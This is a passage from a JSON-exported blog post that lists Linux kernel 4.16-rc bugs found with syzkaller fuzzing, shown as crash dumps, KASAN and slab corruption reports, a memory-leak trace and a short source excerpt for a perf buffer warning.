___sys_recvmsg+0x26c/0x5e0\n[   46.118882]  ? SYSC_recvfrom+0x560/0x560\n[   46.119444]  ? fput+0xa/0x130\n[   46.119782]  ? SYSC_sendto+0x3ff/0x560\n[   46.120224]  ? SYSC_connect+0x420/0x420\n[   46.120611]  ? fget_raw+0x20/0x20\n[   46.120946]  ? selinux_netlbl_socket_setsockopt+0xf1/0x430\n[   46.121505]  ? __sys_recvmsg+0xc9/0x200\n[   46.121892]  ? SyS_sendmmsg+0x50/0x50\n[   46.122282]  ? SyS_futex+0x261/0x31e\n[   46.122654]  ? SyS_futex+0x26a/0x31e\n[   46.123063]  ? security_file_ioctl+0x76/0xb0\n[   46.123589]  ? SyS_recvmsg+0x27/0x40\n[   46.124007]  ? __sys_recvmsg+0x200/0x200\n[   46.124419]  ? do_syscall_64+0x23e/0x7a0\n[   46.124815]  ? _raw_spin_unlock_irq+0x24/0x40\n[   46.125286]  ? finish_task_switch+0x1c2/0x740\n[   46.125719]  ? syscall_return_slowpath+0x470/0x470\n[   46.126212]  ? syscall_return_slowpath+0x2df/0x470\n[   46.126741]  ? prepare_exit_to_usermode+0x330/0x330\n[   46.127282]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[   46.127953]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   46.128478]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[   46.129062] Dumping ftrace buffer:\n[   46.129406]    (ftrace buffer empty)\n[   46.129773] Kernel Offset: 0x2b000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[   46.130866] Rebooting in 86400 seconds..\n```\n\n**End**\n\n\n## anon_vma_chain - slab padding/red zone overwritten\n\nGot from syzkaller & Found in LK v4.16.0-rc7.\n\n### Call Trace (Dump)\n\n> INFO: Slab ADDR objects=18 used=18 fp=0x (null) flags=ADDR\n\n```c\nBUG anon_vma_chain (Not tainted): Padding overwritten. 0x000000006fe6e975-0x00000000d2999cdc\n-----------------------------------------------------------------------------\n\nDisabling lock debugging due to kernel taint\nINFO: Slab 0x00000000b505159c objects=18 used=18 fp=0x          (null) flags=0x500000000008101\nCPU: 1 PID: 12071 Comm: ip Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n slab_err+0xab/0xcf mm/slub.c:724\n slab_pad_check.part.45.cold.81+0x23/0x75 mm/slub.c:864\nPadding 000000006fe6e975: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000004938624c: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000003a30b2bc: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000abc764f9: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000e374b01e: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000ddff5969: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000008d39c33b: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000005f158a09: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000007427554b: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000002e5ffe30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000002180c90a: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000004e6decb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000007a43f35b: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000751350b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000c53b393e: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000740423c9: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 0000000028288523: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000a7a07601: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 0000000033ab7532: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000eb1cbbd8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000fadd1252: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000a40a3d13: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000752136f1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000d39d6b17: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000a577fdeb: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000009f2fb35a: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nFIX anon_vma_chain: Restoring 0x000000006fe6e975-0x00000000d2999cdc=0x5a\n\n=============================================================================\nBUG anon_vma_chain (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x00000000d2aea25c-0x00000000b7560b65. First byte 0x0 instead of 0xcc\nINFO: Slab 0x00000000b505159c objects=18 used=18 fp=0x          (null) flags=0x500000000008101\nINFO: Object 0x000000009f2cb95c @offset=5624 fp=0x          (null)\n\nRedzone 00000000d2aea25c: 00 00 00 00 00 00 00 00                          ........\nObject 000000009f2cb95c: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000008c540521: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 0000000024e5d905: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 0000000087d66cf6: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 0000000040aaa316: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nRedzone 000000006172e99c: 00 00 00 00 00 00 00 00                          ........\nPadding 00000000624f770f: 00 00 00 00 00 00 00 00                          ........\nCPU: 1 PID: 12071 Comm: ip Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX anon_vma_chain: Restoring 0x00000000d2aea25c-0x00000000b7560b65=0xcc\n\nFIX anon_vma_chain: Object at 0x000000009f2cb95c not freed\n=============================================================================\nBUG anon_vma_chain (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x00000000ee235c64-0x000000003480ff57. First byte 0x0 instead of 0xcc\nINFO: Slab 0x00000000b505159c objects=18 used=18 fp=0x          (null) flags=0x500000000008101\nINFO: Object 0x00000000660a475d @offset=8 fp=0x          (null)\n\nRedzone 00000000ee235c64: 00 00 00 00 00 00 00 00                          ........\nObject 00000000660a475d: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000e6e68d84: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000a7674d61: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000e5085e46: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000003b1a98f7: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nRedzone 00000000dde82ea3: 00 00 00 00 00 00 00 00                          ........\nPadding 00000000c33cf2e2: 00 00 00 00 00 00 00 00                          ........\nCPU: 1 PID: 12082 Comm: sh Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX anon_vma_chain: Restoring 0x00000000ee235c64-0x000000003480ff57=0xcc\n\nFIX anon_vma_chain: Object at 0x00000000660a475d not freed\n=============================================================================\nBUG anon_vma_chain (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x000000005f350485-0x0000000076389ac8. First byte 0x0 instead of 0xcc\nINFO: Slab 0x00000000b505159c objects=18 used=18 fp=0x          (null) flags=0x500000000008101\nINFO: Object 0x0000000015376e75 @offset=5192 fp=0x          (null)\n\nRedzone 000000005f350485: 00 00 00 00 00 00 00 00                          ........\nObject 0000000015376e75: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000f0e35b16: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 0000000030f1a66b: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000007ac4d59f: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000008924595b: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nRedzone 00000000d93f0449: 00 00 00 00 00 00 00 00                          ........\nPadding 0000000052bc5876: 00 00 00 00 00 00 00 00                          ........\nCPU: 0 PID: 12097 Comm: modprobe Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX anon_vma_chain: Restoring 0x000000005f350485-0x0000000076389ac8=0xcc\n\nFIX anon_vma_chain: Object at 0x0000000015376e75 not freed\n=============================================================================\nBUG anon_vma_chain (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x0000000090d05828-0x00000000640c301f. First byte 0x0 instead of 0xcc\nINFO: Slab 0x00000000b505159c objects=18 used=18 fp=0x          (null) flags=0x500000000008101\nINFO: Object 0x00000000c3a2e01a @offset=2168 fp=0x          (null)\n\nRedzone 0000000090d05828: 00 00 00 00 00 00 00 00                          ........\nObject 00000000c3a2e01a: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000d974dda9: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000d6a18047: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000c5c1e97d: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 0000000024798423: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nRedzone 000000009b3bd61d: 00 00 00 00 00 00 00 00                          ........\nPadding 000000001712f520: 00 00 00 00 00 00 00 00                          ........\nCPU: 1 PID: 12113 Comm: modprobe Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX anon_vma_chain: Restoring 0x0000000090d05828-0x00000000640c301f=0xcc\n\nFIX anon_vma_chain: Object at 0x00000000c3a2e01a not freed\n=============================================================================\nBUG kmalloc-64 (Tainted: G    B           ): Padding overwritten. 0x00000000e2e92ca3-0x00000000de7fbde8\n-----------------------------------------------------------------------------\n\nINFO: Slab 0x0000000010fbf3d8 objects=19 used=19 fp=0x          (null) flags=0x500000000008101\nCPU: 1 PID: 12160 Comm: modprobe Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n slab_err+0xab/0xcf mm/slub.c:724\n slab_pad_check.part.45.cold.81+0x23/0x75 mm/slub.c:864\nPadding 00000000e2e92ca3: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000003b73d901: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000e1534de7: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000009cad5477: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000003b32512b: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 0000000066d813c6: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000d0266b36: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000000bb47526: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000e0046aa9: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000020f9edd: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000fa9d2db1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000001f39e3a5: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000003da23d9d: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000006882d379: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 0000000013778799: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000000b973d86: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000000e58426f: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 00000000f2649fb2: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nFIX kmalloc-64: Restoring 0x00000000e2e92ca3-0x00000000de7fbde8=0x5a\n\n=============================================================================\nBUG kmalloc-64 (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x0000000084bd3121-0x00000000edba746e. First byte 0x0 instead of 0xcc\nINFO: Slab 0x0000000010fbf3d8 objects=19 used=19 fp=0x          (null) flags=0x500000000008101\nINFO: Object 0x000000003d33a159 @offset=6248 fp=0x          (null)\n\nRedzone 0000000084bd3121: 00 00 00 00 00 00 00 00                          ........\nObject 000000003d33a159: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000003dbc71c6: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000aef4ebae: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000d8014f8b: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nRedzone 0000000005f86c21: 00 00 00 00 00 00 00 00                          ........\nPadding 0000000035d8a4ed: 00 00 00 00 00 00 00 00                          ........\nCPU: 1 PID: 12160 Comm: modprobe Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX kmalloc-64: Restoring 0x0000000084bd3121-0x00000000edba746e=0xcc\n\nFIX kmalloc-64: Object at 0x000000003d33a159 not freed\n=============================================================================\nBUG kmalloc-64 (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x00000000f8dca494-0x0000000099d1331e. First byte 0x0 instead of 0xcc\nINFO: Slab 0x0000000010fbf3d8 objects=19 used=19 fp=0x          (null) flags=0x500000000008101\nINFO: Object 0x0000000053a1a9e8 @offset=840 fp=0x          (null)\n\nRedzone 00000000f8dca494: 00 00 00 00 00 00 00 00                          ........\nObject 0000000053a1a9e8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 0000000007841875: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000000e92da29: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000004ae2b4f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nRedzone 00000000d40f7f3a: 00 00 00 00 00 00 00 00                          ........\nPadding 000000003da1fdd4: 00 00 00 00 00 00 00 00                          ........\nCPU: 1 PID: 12023 Comm: syz-executor0 Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX kmalloc-64: Restoring 0x00000000f8dca494-0x0000000099d1331e=0xcc\n\nFIX kmalloc-64: Object at 0x0000000053a1a9e8 not freed\n=============================================================================\nBUG kmalloc-64 (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x00000000d7a78f15-0x0000000055e37950. First byte 0x0 instead of 0xcc\nINFO: Slab 0x0000000010fbf3d8 objects=19 used=19 fp=0x          (null) flags=0x500000000008101\nINFO: Object 0x000000006aa17a7d @offset=6664 fp=0x          (null)\n\nRedzone 00000000d7a78f15: 00 00 00 00 00 00 00 00                          ........\nObject 000000006aa17a7d: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000005951e69c: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 00000000151f58dd: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject 000000007b7e4602: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nRedzone 00000000ed905c40: 00 00 00 00 00 00 00 00                          ........\nPadding 000000003045bfb1: 00 00 00 00 00 00 00 00                          ........\nCPU: 1 PID: 12023 Comm: syz-executor0 Tainted: G    B            4.16.0-rc6+ #21\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX kmalloc-64: Restoring 0x00000000d7a78f15-0x0000000055e37950=0xcc\n\nFIX kmalloc-64: Object at 0x000000006aa17a7d not freed\n=============================================================================\nBUG task_struct (Tainted: G    B           ): Padding overwritten. 0x00000000f74e5132-0x0000000051a28b29\n```\n\n**End**\n\n\n","excerpt":"dev_hard_start_xmit - soft lockup Found in LK v4.16.0-rc7.  stuck for 30s. Call Trace (Dump) Code Code : \nc8 00 00 00 48 c1 ea 03 48 01 c3 …","fields":{"slug":"/2018-03-4-Founds/"},"frontmatter":{"date":"Mar 24, 2018","title":"Linux Kernel - 2018-03-4 Founds","tags":["Security","Linux-Kernel"],"update":"Mar 30, 2018"},"timeToRead":31}},{"node":{"rawMarkdownBody":"\n## perf_trace_buf_alloc - warn\n\nFound in *LK v4.16.0-rc5*.\n\n### Call Trace (Dump)\n\n```c\n[  100.240063] perf buffer not large enough\n[  100.240092] WARNING: CPU: 0 PID: 23132 at kernel/trace/trace_event_perf.c:288 perf_trace_buf_alloc+0x12a/0x170\n[  100.241844] Kernel panic - not syncing: panic_on_warn set ...\n```\n\n### Code\n\nIn ```/include/linux/trace_events.h```.\n\n```c\n#define PERF_MAX_TRACE_SIZE\t2048\n...\n\nvoid *perf_trace_buf_alloc(int size, struct pt_regs **regs, int *rctxp)\n{\n\tchar *raw_data;\n\tint rctx;\n\n\tBUILD_BUG_ON(PERF_MAX_TRACE_SIZE % sizeof(unsigned long));\n\n\tif (WARN_ONCE(size > PERF_MAX_TRACE_SIZE,\n\t\t      \"perf buffer not large enough\"))\n\t\treturn NULL;\n\n\t*rctxp = rctx = perf_swevent_get_recursion_context();\n\tif (rctx < 0)\n\t\treturn NULL;\n\n\tif (regs)\n\t\t*regs = this_cpu_ptr(&__perf_regs[rctx]);\n\traw_data = this_cpu_ptr(perf_trace_buf[rctx]);\n\n\t/* zero the dead bytes from align to not leak stack to user */\n\tmemset(&raw_data[size - sizeof(u64)], 0, sizeof(u64));\n\treturn raw_data;\n}\n```\n\nJust size is over ```2048```, so *WARN_ONCE* is just called...\n\nAnd all of the codes which reference ```perf_tracE_buf_alloc``` are maybe safe because of handling null value. \n\n**End**\n\n\n\n## socket - memory leak\n\nGot from syzkaller & Found in *LK v4.16.0-rc5* with enabling ```CONFIG_FAULT_INJECTION```.\n\n### Call Trace (Dump)\n\n```c\n[  144.332562] FAULT_INJECTION: forcing a failure.\n[  144.332562] name failslab, interval 1, probability 0, space 0, times 0\n[  144.333783] CPU: 0 PID: 6129 Comm: syz-executor4 Not tainted 4.16.0-rc5+ #12\n[  144.334423] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  144.335236] Call Trace:\n[  144.335453]  dump_stack+0xb9/0x11b\n[  144.335788]  should_fail.cold.3+0x3d/0x4f\n[  144.336155]  ? should_failslab+0x5e/0x90\n[  144.336533]  ? kmem_cache_alloc_trace+0x244/0x340\n[  144.336945]  ? sctp_auth_shkey_create+0x33/0x80\n[  144.337350]  ? sctp_endpoint_new+0x1be/0x3b0\n[  144.337798]  ? sctp_init_sock+0x219/0x3b0\n[  144.338233]  ? sctp_destroy_sock+0x140/0x140\n[  144.338662]  ? inet6_create+0x35f/0x630\n[  144.339063]  ? __sock_create+0x231/0x3e0\n[  144.339470]  ? SyS_socket+0x5e/0xc0\n[  144.339843]  ? do_syscall_64+0x73/0x1f0\n[  144.340348]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  144.817626] kmemleak: 2 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n[  150.885525] kmemleak: 2 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n2018/03/12 14:50:35 BUG: memory leak\nferenced object 0xffff8e356d2e0880 (size 1872):\n  comm \"syz-executor4\", pid 6106, jiffies 4294811594 (age 6.629s)\n  hex dump (first 32 bytes):\n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n    0a 00 07 40 00 00 00 00 00 00 00 00 00 00 00 00  ...@............\n  backtrace:\n    [<000000004c693a10>] 0xffffffffffffffff\n\n2018/03/12 14:50:35 BUG: memory leak\nunreferenced object 0xffff8e357a154760 (size 32):\n  comm \"syz-executor4\", pid 6106, jiffies 4294811594 (age 6.636s)\n  hex dump (first 32 bytes):\n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n    03 00 00 00 03 00 00 00 0f 00 00 00 00 00 00 00  ................\n  backtrace:\n    [<000000004c693a10>] 0xffffffffffffffff\n```\n\n**End**\n\n\n\n## xfrm_state_find - stack out of bounds\n\nFound in *LK v4.16.0-rc6*.\n\nstack-out-of-bounds in xfrm_state_find, 4 bytes read.\n\n### Call Trace (Dump)\n\n```c\n[  467.981313]  dump_stack+0x10a/0x1dd\n[  467.981824]  ? _atomic_dec_and_lock+0x163/0x163\n[  467.982417]  ? show_regs_print_info+0x12/0x12\n[  467.983088]  ? xfrm_state_find+0x3c6/0x30f0\n[  467.983660]  print_address_description+0x60/0x224\n[  467.984438]  ? xfrm_state_find+0x3c6/0x30f0\n[  467.985208]  kasan_report+0x196/0x2a0\n[  467.985839]  ? xfrm_state_find+0x2ea6/0x30f0\n[  467.986510]  ? xfrm_state_find+0x2ea6/0x30f0\n[  467.987035]  ? save_trace+0x300/0x300\n[  467.987683]  ? xfrm_state_afinfo_get_rcu+0x170/0x170\n[  467.988511]  ? find_held_lock+0x32/0x1b0\n[  467.989193]  ? print_usage_bug+0x140/0x140\n[  467.989939]  ? lock_acquire+0x4a0/0x4a0\n[  467.990594]  ? print_usage_bug+0x140/0x140\n[  467.991269]  ? rcutorture_record_progress+0x10/0x10\n[  467.992089]  ? __lock_is_held+0xad/0x140\n[  467.992805]  ? dequeue_task_fair+0x3730/0x3730\n[  467.993593]  ? __lock_acquire+0x911/0x4670\n[  467.994320]  ? __lock_acquire+0x911/0x4670\n[  467.994977]  ? reweight_entity+0xfe0/0xfe0\n[  467.995468]  ? put_prev_task_fair+0x70/0x70\n[  467.996041]  ? debug_check_no_locks_freed+0x210/0x210\n[  467.996743]  ? debug_check_no_locks_freed+0x210/0x210\n[  467.997342]  ? dequeue_task_fair+0x1586/0x3730\n[  467.997961]  ? print_usage_bug+0x140/0x140\n[  467.998657]  ? xfrm_tmpl_resolve+0x2be/0xb30\n[  467.999321]  ? __xfrm_decode_session+0xf0/0xf0\n[  468.000063]  ? rcu_read_lock_sched_held+0xe4/0x120\n[  468.000597]  ? fib_table_lookup+0xa64/0x1960\n[  468.001290]  ? xfrm_resolve_and_create_bundle+0x134/0x27e0\n[  468.002054]  ? print_usage_bug+0x140/0x140\n[  468.002742]  ? save_trace+0x300/0x300\n[  468.003395]  ? save_trace+0x300/0x300\n[  468.003849]  ? __lock_acquire+0x911/0x4670\n[  468.004300]  ? xfrm_tmpl_resolve+0xb30/0xb30\n[  468.004790]  ? print_usage_bug+0x140/0x140\n[  468.005249]  ? find_held_lock+0x32/0x1b0\n[  468.005615]  ? xfrm_sk_policy_lookup+0x306/0x450\n[  468.006131]  ? lock_acquire+0x4a0/0x4a0\n[  468.006474]  ? lock_downgrade+0x6e0/0x6e0\n[  468.008510]  ? refcount_inc_not_zero+0xf5/0x180\n[  468.008982]  ? rcutorture_record_progress+0x10/0x10\n[  468.009514]  ? xfrm_selector_match+0x36/0xdc0\n[  468.010028]  ? xfrm_sk_policy_lookup+0x32f/0x450\n[  468.010523]  ? xfrm_selector_match+0xdc0/0xdc0\n[  468.011027]  ? xfrm_lookup+0x336/0x21a0\n[  468.011376]  ? xfrm_lookup+0x336/0x21a0\n[  468.011745]  ? set_load_weight+0x270/0x270\n[  468.012272]  ? xfrm_policy_lookup_bytype.constprop.49+0x1700/0x1700\n[  468.013118]  ? find_held_lock+0x32/0x1b0\n[  468.013609]  ? ip_route_output_key_hash+0x229/0x350\n[  468.014352]  ? lock_acquire+0x4a0/0x4a0\n[  468.014825]  ? lock_downgrade+0x6e0/0x6e0\n[  468.015359]  ? find_held_lock+0x32/0x1b0\n[  468.015827]  ? rcutorture_record_progress+0x10/0x10\n[  468.016418]  ? raw_sendmsg+0x89a/0x3b80\n[  468.016883]  ? ip_route_output_key_hash+0x252/0x350\n[  468.017519]  ? ip_route_output_key_hash_rcu+0x2c70/0x2c70\n[  468.018206]  ? debug_check_no_locks_freed+0x210/0x210\n[  468.018816]  ? xfrm_lookup_route+0x34/0x1a0\n[  468.019364]  ? ip_route_output_flow+0x86/0xa0\n[  468.019834]  ? raw_sendmsg+0xef5/0x3b80\n[  468.020248]  ? raw_getsockopt+0xd0/0xd0\n[  468.020691]  ? refill_pi_state_cache.part.7+0x2f0/0x2f0\n[  468.021153]  ? _raw_spin_unlock_irqrestore+0x46/0x60\n[  468.021590]  ? get_futex_value_locked+0xc0/0xf0\n[  468.022099]  ? futex_wait_setup+0x1f9/0x380\n[  468.022659]  ? save_trace+0x300/0x300\n[  468.023075]  ? find_held_lock+0x32/0x1b0\n[  468.023511]  ? futex_wake+0x630/0x630\n[  468.023920]  ? futex_wake+0x528/0x630\n[  468.024341]  ? __might_fault+0x104/0x1b0\n[  468.024784]  ? lock_downgrade+0x6e0/0x6e0\n[  468.025245]  ? rw_copy_check_uvector+0x227/0x2f0\n[  468.025668]  ? import_iovec+0x20b/0x3d0\n[  468.026105]  ? sock_has_perm+0x26e/0x360\n[  468.026527]  ? selinux_secmark_relabel_packet+0xc0/0xc0\n[  468.027099]  ? _copy_from_user+0x94/0x100\n[  468.027534]  ? inet_sendmsg+0x12d/0x590\n[  468.027947]  ? inet_sk_rebuild_header+0x1b30/0x1b30\n[  468.028463]  ? SYSC_sendto+0x560/0x560\n[  468.028881]  ? inet_sk_rebuild_header+0x1b30/0x1b30\n[  468.029438]  ? sock_sendmsg+0xc0/0x100\n[  468.029840]  ? ___sys_sendmsg+0x2e9/0x820\n[  468.030237]  ? copy_msghdr_from_user+0x4f0/0x4f0\n[  468.030726]  ? finish_task_switch+0x182/0x740\n[  468.031282]  ? set_load_weight+0x270/0x270\n[  468.031800]  ? lock_repin_lock+0x410/0x410\n[  468.032354]  ? __fget_light+0x28c/0x3a0\n[  468.032825]  ? __schedule+0x75c/0x1ea0\n[  468.033315]  ? __sched_text_start+0x8/0x8\n[  468.033813]  ? __sys_sendmmsg+0x1ce/0x590\n[  468.034328]  ? SyS_sendmsg+0x40/0x40\n[  468.034771]  ? fget_raw+0x20/0x20\n[  468.035246]  ? selinux_netlbl_socket_setsockopt+0xf1/0x430\n[  468.035925]  ? schedule+0xf0/0x3a0\n[  468.036495]  ? __schedule+0x1ea0/0x1ea0\n[  468.036994]  ? SyS_futex+0x261/0x31e\n[  468.037455]  ? SyS_futex+0x26a/0x31e\n[  468.037919]  ? exit_to_usermode_loop+0x139/0x1e0\n[  468.038498]  ? do_futex+0x1f50/0x1f50\n[  468.038925]  ? exit_to_usermode_loop+0x181/0x1e0\n[  468.039437]  ? 